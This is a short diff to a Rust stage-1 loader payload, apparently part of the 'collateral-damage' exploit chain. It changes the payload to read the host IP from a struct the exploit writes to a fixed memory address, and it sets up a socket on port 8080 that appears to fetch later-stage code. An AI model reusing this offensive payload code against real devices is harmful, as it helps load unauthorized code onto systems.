@@ -38,6 +38,15 @@ const STAGE1_READ_STAGE2_FAILED: u64 = 0x10000003;
 const STAGE1_READ_EXE_LEN_FAILED: u64 = 0x10000004;
 const STAGE1_READ_EXE_FAILED: u64 = 0x10000005;
 
+const GLOBAL_INFO: u64 = 0x44000000;
+
+// struct representing the info passed in from gamescript at a static address
+// Reference: https://github.com/exploits-forsale/collateral-damage/blob/f39189558e97c0e3418d7f328604cb66a52dba5b/collat_payload/collat_payload.c#L20C1-L20C78
+#[repr(C)]
+struct COLLAT_INFO {
+    ip_addr: [u8; 0x20]
+}
+
 #[used]
 #[no_mangle]
 // Required because compiler_builtins expects this symbol to be present
@@ -124,13 +133,16 @@ pub extern "C" fn main() -> u64 {
             0,
         );
 
+        let collat_info_ptr = GLOBAL_INFO as *mut COLLAT_INFO;
+        let collat_info_ref: &mut COLLAT_INFO = collat_info_ptr.as_mut().unwrap();
+
         let sockaddr = SOCKADDR_IN {
             sin_family: AF_INET,
             sin_port: u16::from_le_bytes(8080u16.to_be_bytes()),
             sin_addr: IN_ADDR {
                 S_un: windows_sys::Win32::Networking::WinSock::IN_ADDR_0 {
                     S_addr: (inet_addr)(
-                        concat!(include_str!("../../../host_ip.txt"), "\0").as_ptr() as *const _,
+                        collat_info_ref.ip_addr.as_ptr() as *const _,
                     ),
                 },
             },
